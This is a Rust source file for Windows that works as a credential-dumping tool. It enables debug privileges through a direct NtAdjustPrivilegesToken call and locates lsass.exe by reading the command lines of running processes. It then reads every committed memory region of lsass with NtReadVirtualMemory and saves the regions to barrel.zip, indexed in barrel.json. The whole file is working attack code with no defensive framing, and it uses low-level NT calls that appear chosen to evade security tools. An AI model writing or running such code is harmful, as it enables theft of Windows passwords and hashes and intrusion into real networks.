use std::{
    ffi::c_void,
    ptr::{null_mut},
    fs::File,
    io::Write
};
use winapi::{
    shared::{
        minwindef::{DWORD, FALSE, ULONG},
        ntdef::{LUID, NTSTATUS, PWSTR, USHORT},
    },
    um::{
        handleapi::CloseHandle,
        winnt::{
            MEMORY_BASIC_INFORMATION, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
            PAGE_NOACCESS, MEM_COMMIT, MAXIMUM_ALLOWED
        },
    },
};
use zip::write::FileOptions;
use zip::ZipWriter;


extern "system" {
    fn NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: *mut HANDLE) -> NTSTATUS;
    fn NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: *mut TOKEN_PRIVILEGES, BufferLength: DWORD, PreviousState: *mut TOKEN_PRIVILEGES, ReturnLength: *mut DWORD) -> NTSTATUS;
    fn NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: usize, NumberOfBytesRead: *mut usize) -> NTSTATUS;
    fn NtQueryInformationProcess(ProcessHandle: HANDLE, ProcessInformationClass: ULONG, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: *mut ULONG) -> NTSTATUS;
    fn NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: u32, HandleAttributes: u32, Flags: u32, NewProcessHandle: *mut HANDLE) -> NTSTATUS;
    fn NtQueryVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MemoryInformationClass, MemoryInformation: PVOID, MemoryInformationLength: usize, ReturnLength: *mut usize) -> NTSTATUS;
}


const PROCESS_BASIC_INFORMATION_CLASS: ULONG = 0;
const STATUS_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
const STATUS_INVALID_PARAMETER: i32 = 0x8000000Du32 as i32;
const NT_SUCCESS: fn(NTSTATUS) -> bool = |status| status >= 0;
type HANDLE = *mut c_void;
type BOOLEAN = u8;
type PVOID = *mut c_void;


#[repr(C)]
struct TOKEN_PRIVILEGES {
    privilege_count: DWORD,
    privileges: [LUID_AND_ATTRIBUTES; 1],
}

#[repr(C)]
struct LUID_AND_ATTRIBUTES {
    luid: LUID,
    attributes: DWORD,
}


#[allow(dead_code)]
#[derive(Debug, Clone)]
struct MemFile {
    filename: String,
    content: Vec<u8>,
    size: usize,
}

#[allow(dead_code)]
#[repr(C)]
struct UNICODE_STRING {
    length: USHORT,
    maximum_length: USHORT,
    buffer: PWSTR,
}

#[repr(C)]
struct TOKEN_PRIVILEGES_STRUCT {
    privilege_count: DWORD,
    luid: LUID,
    attributes: DWORD,
}

#[repr(u32)]
#[derive(Debug, Clone, Copy)]
pub enum MemoryInformationClass {
    MemoryBasicInformation = 0,
}


fn enable_debug_privileges() -> Result<(), String> {
    unsafe {
        let current_process: HANDLE = -1isize as HANDLE;
        let mut token_handle: HANDLE = null_mut();

        let status = NtOpenProcessToken(
            current_process as *mut std::ffi::c_void,
            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
            &mut token_handle,
        );

        if !NT_SUCCESS(status) {
            return Err(format!(
                "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x{:08X}",
                status
            ));
        }

        let mut token_privileges = TOKEN_PRIVILEGES_STRUCT {
            privilege_count: 1,
            luid: LUID { LowPart: 20, HighPart: 0 },
            attributes: 0x00000002,
        };

        let status = NtAdjustPrivilegesToken(
            token_handle,
            FALSE as BOOLEAN,
            &mut token_privileges as *mut _ as *mut TOKEN_PRIVILEGES,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as DWORD,
            null_mut(),
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
            return Err(format!(
                "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{:08X}",
                status
            ));
        }

        CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
        println!("[+] Debug privileges enabled successfully.");
        Ok(())
    }
}


fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}


unsafe fn read_remote_int_ptr(process: HANDLE, address: PVOID) -> Option<PVOID> {
    let mut buffer = [0u8; 8];
    let mut bytes_read = 0usize;
    let status = NtReadVirtualMemory(
        process,
        address,
        buffer.as_mut_ptr() as PVOID,
        buffer.len(),
        &mut bytes_read,
    );

    if status != 0 && status != STATUS_ACCESS_VIOLATION && status != STATUS_INVALID_PARAMETER {
        eprintln!(
            "[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x{:X} reading address {:p}",
            status, address
        );
        return None;
    }

    let value = *(buffer.as_ptr() as *const usize) as PVOID;
    Some(value)
}


unsafe fn read_remote_wstr(process: HANDLE, address: PVOID) -> String {
    let mut buffer = [0u8; 256];
    let mut bytes_read = 0usize;
    let status = NtReadVirtualMemory(
        process,
        address,
        buffer.as_mut_ptr() as PVOID,
        buffer.len(),
        &mut bytes_read,
    );

    if status != 0 && status != STATUS_ACCESS_VIOLATION && status != STATUS_INVALID_PARAMETER {
        eprintln!(
            "[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x{:X} reading address {:p}",
            status, address
        );
    }

    let mut output = Vec::new();
    for i in (0..buffer.len() - 1).step_by(2) {
        let wchar = u16::from_le_bytes([buffer[i], buffer[i + 1]]);
        if wchar == 0 {
            break;
        }
        output.push(wchar);
    }

    String::from_utf16_lossy(&output)
}


unsafe fn get_proc_name_from_handle(process: HANDLE) -> Option<String> {
    let peb_offset = 0x8;
    let processparameters_offset = 0x20;
    let commandline_offset = 0x68;

    let mut pbi_buffer = [0u8; 48];
    let mut return_length: ULONG = 0;

    let status = NtQueryInformationProcess(
        process,
        PROCESS_BASIC_INFORMATION_CLASS,
        pbi_buffer.as_mut_ptr() as PVOID,
        pbi_buffer.len() as ULONG,
        &mut return_length,
    );

    if !nt_success(status) {
        eprintln!(
            "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}",
            status
        );
        return None;
    }

    let peb_address_ptr = *(pbi_buffer.as_ptr().add(peb_offset) as *const *const c_void);
    let process_parameters_ptr = (peb_address_ptr as usize + processparameters_offset) as PVOID;
    let process_parameters = read_remote_int_ptr(process, process_parameters_ptr)?;

    let commandline_ptr = (process_parameters as usize + commandline_offset) as PVOID;
    let commandline = read_remote_int_ptr(process, commandline_ptr)?;
    Some(read_remote_wstr(process, commandline))
}


fn to_lowercase_ascii(s: &mut String) {
    *s = s.to_ascii_lowercase();
}


unsafe fn get_process_by_name(target_name: &str) -> Option<HANDLE> {
    let mut handle: HANDLE = null_mut();

    while nt_success(NtGetNextProcess(handle, MAXIMUM_ALLOWED, 0, 0, &mut handle)) {
        if let Some(mut name) = get_proc_name_from_handle(handle) {
            to_lowercase_ascii(&mut name);
            if name == target_name {
                return Some(handle);
            }
        }
    }

    None
}


fn create_memory_zip(memfile_list: Vec<MemFile>, zip_path: &str) -> std::io::Result<()> {
    // Create the ZIP file
    let file = File::create(zip_path)?;
    let mut zip = ZipWriter::new(file);

    // Add each memory region to the ZIP
    for memfile in memfile_list {
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);
        
        zip.start_file(memfile.filename, options)?;
        zip.write_all(&memfile.content)?;
    }

    // Finalize the ZIP file
    zip.finish()?;
    Ok(())
}


unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
    enable_debug_privileges()?;    
    let h_process = match get_process_by_name("c:\\windows\\system32\\lsass.exe") {
        Some(h) => h,
        None => {
            eprintln!("[-] Process not found.");
            return Err("Process not found".to_string());
        }
    };

    let proc_max_address_l: u64 = 0x7FFFFFFEFFFF;
    let mut mem_address: PVOID = std::ptr::null_mut();    
    let mut json_output = String::new();
    let mut memfile_list: Vec<MemFile> = Vec::with_capacity(1000);
    let mut memfile_count = 0;

    // Loop through the memory regions
    while (mem_address as u64) < proc_max_address_l {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let mut return_size: usize = 0;

        // If you defined the enum manually (Option 1 from previous answer):
        let ntstatus = unsafe {
            NtQueryVirtualMemory(
                h_process,
                mem_address,
                MemoryInformationClass::MemoryBasicInformation,  // Use enum variant instead of 0
                &mut mbi as *mut _ as PVOID,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                &mut return_size,
            )
        };
        
        if ntstatus != 0 {
            println!("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x{:x}", ntstatus);
        }

        // If readable and committed --> Get information
        if mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT {
            // Create buffer for memory content
            let region_size = mbi.RegionSize;
            let mut buffer: Vec<u8> = vec![0; region_size];
            let mut bytes_read: usize = 0;

            // Read memory
            let status = unsafe {
                NtReadVirtualMemory(
                    h_process,
                    mbi.BaseAddress as *mut std::ffi::c_void,  // Explicit cast
                    // mbi.BaseAddress,
                    // buffer.as_mut_ptr() as *mut winapi::ctypes::c_void,
                    buffer.as_mut_ptr() as PVOID,
                    region_size,
                    &mut bytes_read,
                )
            };

            // println!("{}", status);
            if status != 0 && status != 0x8000000Du32 as i32 { // 0x8000000D = Partial copy
                println!("NtReadVirtualMemory failed with status: 0x{:X}", status);
            }

            // let fname = format!("{:x}", mbi.BaseAddress as usize);

            let json_item = format!(
                "{{\"field0\":\"{:p}\", \"field1\":\"{:p}\", \"field2\":{}}}, ",
                mem_address,
                mem_address,
                mbi.RegionSize
            );

            json_output.push_str(&json_item);

            let mem_file = MemFile {
                filename: format!("0x{:X}", mbi.BaseAddress as usize),
                content: buffer,
                size: region_size,
            };
            
            if memfile_count < memfile_list.capacity() {
                memfile_list.push(mem_file);
                memfile_count += 1;
            } else {
                println!("[-] Memfile list capacity exceeded");
                break;
            }
        }
        
        // Move to next memory region
        mem_address = unsafe {
            (mbi.BaseAddress as *mut u8).add(mbi.RegionSize) as PVOID
        };
    }

    println!("[+] Number of regions:\t{}", memfile_count);

    let json_output_final = format!("[{}]", json_output.trim_end_matches(", "));
    match File::create(json_file)
        .and_then(|mut file| file.write_all(json_output_final.as_bytes()))
    {
        Ok(_) => println!("[+] File {} generated correctly", json_file),
        Err(e) => eprintln!("[-] Error writing to barrel.json: {}", e),
    }

    match create_memory_zip(memfile_list, zip_file) {
        Ok(_) => println!("[+] File {}  generated correctly", zip_file),
        Err(e) => eprintln!("[-] Error creating ZIP file: {}", e),
    }

    Ok(())
}


fn main() {
    unsafe {
        let json_file = "barrel.json";
        let zip_file  = "barrel.zip";
        if let Err(e) = barrel(json_file, zip_file) {
            eprintln!("Error: {}", e);
        }
    }
}